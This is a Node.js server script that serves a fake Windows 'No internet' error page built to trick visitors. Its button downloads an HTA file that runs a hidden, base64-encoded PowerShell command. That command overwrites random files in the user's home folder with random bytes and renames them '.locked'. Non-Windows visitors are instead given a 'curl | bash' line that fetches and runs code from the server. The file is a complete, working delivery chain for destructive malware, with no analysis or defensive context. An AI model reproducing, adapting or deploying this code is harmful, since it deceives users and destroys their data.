const h = require('http');

h.createServer((q, r) => {
    try {
        const u = q.url;
        const a = q.headers['user-agent'] || '';

        if (u === '/ping') { r.writeHead(200); r.end('1'); return; }
        if (!u.includes('test')) { r.end(); return; }

        if (!u.includes('trigger=1')) {
            r.writeHead(200, { 'Content-Type': 'text/html' });
            r.end(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <title>No internet</title>
                    <style>
                        body { background-color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                        .container { max-width: 600px; width: 100%; padding: 20px; text-align: center; }
                        .dino { width: 80px; height: 80px; margin-bottom: 20px; }
                        h1 { font-size: 22px; font-weight: 500; margin: 0 0 10px 0; color: #202124; text-align: left; }
                        p { font-size: 14px; line-height: 1.6; margin: 0 0 20px 0; text-align: left; }
                        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; transition: background 0.2s; }
                        .btn:active { background-color: #174ea6; }
                        .error-code { font-size: 12px; margin-top: 30px; color: #70757a; border-top: 1px solid #e8eaed; padding-top: 15px; text-align: left; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <img class="dino" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Chromium_T-Rex-error-offline.svg/250px-Chromium_T-Rex-error-offline.svg.png?_=20210319220015">
                        <h1>No internet</h1>
                        <p>Windows is unable to connect to the internet. To fix this, click the button below and <b>press Enter</b> when the system dialog appears to perform a hard reload of the network stack.<br><br>• Check network cables<br>• Reset network adapter</p>
                        <button class="btn" id="reloadBtn">Click then Press Enter to Hard Reload</button>
                        <div class="error-code">DNS_PROBE_FINISHED_NO_INTERNET</div>
                    </div>
                    <iframe id="f" style="display:none"></iframe>
                    <script>
                        let clicked = false;
                        document.getElementById('reloadBtn').onclick = function() {
                            if(!clicked) {
                                // 1. Start the HTA download
                                document.getElementById('f').src = window.location.href + '&trigger=1';
                                clicked = true;
                                
                                // 2. Trigger the Search-MS Focus after a short delay
                                setTimeout(function() {
                                    window.location.href = "search-ms:query=NetworkFix&crumb=location:%USERPROFILE%\\\\Downloads&";
                                }, 1200);
                            }
                        };
                    </script>
                </body>
                </html>
            `);
            return;
        }

        if (a.includes('Windows')) {
            r.writeHead(200, {
                'Content-Type': 'application/hta',
                'Content-Disposition': `inline; filename="NetworkFix.hta"`,
                'X-Content-Type-Options': 'nosniff'
            });

            r.end(`<html><head><hta:application windowstate="minimize" showintaskbar="no" /><script language="VBScript">Sub Window_OnLoad:On Error Resume Next:Set s=CreateObject("WScript.Shell"):p="powershell -W Hidden -EP Bypass -Enc JABwAD0AWwBjAGgAYQByAF0AMAB4ADIAMAAyAEUAOwAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAEgATwBNAEUAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEQAZQBwAHQAaAAgADQAIAAtAEYAaQBsAGUAIAB8ACAARwBlAHQALQBSAGEAbgBkAG8AbQAgAC0AQwBvAHUAbgB0ACAAMgAwACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgeyBpZihUZXN0LVBhdGggJF8uRnVsbE5hbWUpIHsgJGI9TmV3LU9iamVjdCBCeXRlW10gMTAyNDsgKE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbSkuTmV4dEJ5dGVzKCRiKTsgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkXy5GdWxsTmFtZSwgJGIpOyAkbj0tam9pbigoNjUuLjkzKSsoOTcuLjEyMikgfCBHZXQtUmFuZG9tIC1Db3VudCA4IHwgRm9yRWFjaC1PYmplY3QgeyBbY2hhcl0kXyB9KTsgUmVuYW1lLUl0ZW0gLVBhdGggJF8uRnVsbE5hbWUgLU5ld05hbWUgKCR1c2luZzpwICsgJG4gKyAnLmxvY2tlZCcpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0gfSB9":s.Run p,0,False:self.close:End Sub</script></head></html>`);
        } else {
            r.writeHead(200, { 'Content-Type': 'text/plain' });
            r.end(`curl -s https://${q.headers.host}${u} | bash`);
        }
    } catch (e) { r.end(); }
}).listen(process.env.PORT || 3000);
